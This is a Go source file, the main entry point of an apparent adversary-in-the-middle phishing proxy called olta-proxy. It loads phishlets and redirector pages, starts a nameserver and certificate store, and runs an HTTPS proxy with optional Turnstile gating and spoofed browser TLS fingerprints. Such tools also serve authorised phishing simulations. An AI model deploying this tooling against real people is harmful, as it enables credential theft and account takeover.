package main

import (
	"flag"
	_log "log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/caddyserver/certmagic"
	feedclient "github.com/s4l1hs/olta/pkg/feed/client"
	"github.com/s4l1hs/olta/pkg/proxy/campaignstore"
	"github.com/s4l1hs/olta/pkg/proxy/core"
	"github.com/s4l1hs/olta/pkg/proxy/database"
	"github.com/s4l1hs/olta/pkg/proxy/log"
	"github.com/s4l1hs/olta/pkg/runtimepath"
	"go.uber.org/zap"
)

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var asset_dir = flag.String("asset-dir", "", "Runtime asset directory containing templates and redirectors")
var version_flag = flag.Bool("v", false, "Show version")
var campaign_db = flag.String("g", "", "Full path to the Olta campaign SQLite database")
var feed_enabled = flag.Bool("feed", false, "Enable live feed")
var feed_url = flag.String("feed-url", feedclient.Endpoint(""), "Olta Feed WebSocket endpoint")
var turnstile = flag.String("turnstile", "", "Turnstile public/private key separated by \":\"")
var rate_limit = flag.Int("rate-limit", 0, "Maximum requests per IP in each rate window (0 disables throttling)")
var rate_window = flag.Duration("rate-window", time.Minute, "Per-IP request throttling window")
var client_profile = flag.String("client-profile", "Chrome", "Outbound TLS client profile (Chrome, Firefox, Safari, or Random)")

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func makeFlagPathAbsolute(path *string) error {
	if *path == "" || filepath.IsAbs(*path) {
		return nil
	}
	absolute, err := filepath.Abs(*path)
	if err != nil {
		return err
	}
	*path = absolute
	return nil
}

func main() {
	flag.Parse()
	if *version_flag == true {
		log.Info("version: %s", core.VERSION)
		return
	}
	if *campaign_db == "" {
		log.Fatal("you need to provide the full path to the Olta campaign database: ./olta-proxy -g /opt/olta/cmd/olta-campaign/olta-campaign.db")
		return
	}
	for _, path := range []*string{campaign_db, phishlets_dir, redirectors_dir, cfg_dir} {
		if err := makeFlagPathAbsolute(path); err != nil {
			log.Fatal("path: %v", err)
			return
		}
	}

	assets, err := runtimepath.Resolve(*asset_dir, "olta-proxy", "templates", "redirectors")
	if err != nil {
		log.Fatal("assets: %v", err)
		return
	}
	if err := os.Chdir(assets); err != nil {
		log.Fatal("assets: %v", err)
		return
	}

	core.Banner()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(assets, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = joinPath(assets, "./legacy_phishlets")
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				*phishlets_dir = "/usr/share/olta/proxy/phishlets/"
				if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
					log.Fatal("you need to provide the path to directory where your phishlets are stored: ./olta-proxy -p <phishlets_path>")
					return
				}
			}
		}
	}
	if *redirectors_dir == "" {
		*redirectors_dir = joinPath(assets, "./redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			*redirectors_dir = "/usr/share/olta/proxy/redirectors/"
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				*redirectors_dir = joinPath(assets, "./redirectors")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".olta", "proxy")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err = os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}
	defer func() {
		if err := db.Close(); err != nil {
			log.Error("proxy database shutdown: %v", err)
		}
	}()

	campaignEvents, err := campaignstore.New(*campaign_db, *feed_url, *feed_enabled)
	if err != nil {
		log.Fatal("campaign event store: %v", err)
		return
	}
	defer func() {
		if err := campaignEvents.Close(); err != nil {
			log.Error("campaign event store shutdown: %v", err)
		}
	}()

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"), db)
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	ns, err := core.NewNameserver(cfg)
	if err != nil {
		log.Fatal("nameserver: %v", err)
		return
	}
	ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	var hp *core.HttpProxy

	if *turnstile != "" {
		turnstileParts := strings.SplitN(*turnstile, ":", 2)
		if len(turnstileParts) != 2 || turnstileParts[0] == "" || turnstileParts[1] == "" {
			log.Fatal("turnstile keys must use the format <public-key>:<private-key>")
			return
		}
		hs, err := core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
		if err != nil {
			log.Fatal("turnstile server: %v", err)
			return
		}
		hp, err = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, campaignEvents, bl, *developer_mode, true, *rate_limit, *rate_window, *client_profile)
		if err != nil {
			log.Fatal("proxy: %v", err)
			return
		}
		hs.Start(hp)
	} else {
		hp, err = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, campaignEvents, bl, *developer_mode, false, *rate_limit, *rate_window, *client_profile)
		if err != nil {
			log.Fatal("proxy: %v", err)
			return
		}
	}

	hp.Start()

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	t.DoWork()
}
